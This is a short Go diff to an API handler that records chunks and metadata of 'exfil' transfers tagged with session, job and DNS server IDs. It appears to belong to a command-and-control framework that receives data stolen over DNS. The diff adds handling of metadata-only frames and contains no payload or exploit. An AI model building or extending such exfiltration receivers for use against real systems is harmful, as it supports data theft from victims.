@@ -1838,8 +1838,30 @@ func (api *APIServer) handleSubmitExfilChunk(w http.ResponseWriter, r *http.Requ
 		dnsServerID = req.DNSServerID
 	}
 
-	if req.SessionID == "" || req.PayloadB64 == "" {
-		api.sendError(w, http.StatusBadRequest, "session_id and payload_b64 are required")
+	if req.SessionID == "" {
+		api.sendError(w, http.StatusBadRequest, "session_id is required")
+		return
+	}
+
+	// Handle metadata-only frames (empty payload, used to register TotalChunks/FileName/FileSize)
+	if req.PayloadB64 == "" {
+		// This is a header/metadata frame - just update transfer metadata, don't store a chunk
+		transfer, err := api.db.EnsureExfilTransfer(req.SessionID, req.JobID, dnsServerID, req.FileName, req.FileSize, req.TotalChunks)
+		if err != nil {
+			api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to update exfil metadata: %v", err))
+			return
+		}
+		response := map[string]interface{}{
+			"session_id": req.SessionID,
+			"ack_next":   true,
+			"completed":  false,
+		}
+		if transfer != nil {
+			response["transfer"] = transfer
+			response["status"] = transfer.Status
+			response["total_chunks"] = transfer.TotalChunks
+		}
+		api.sendSuccess(w, "exfil metadata recorded", response)
 		return
 	}
 
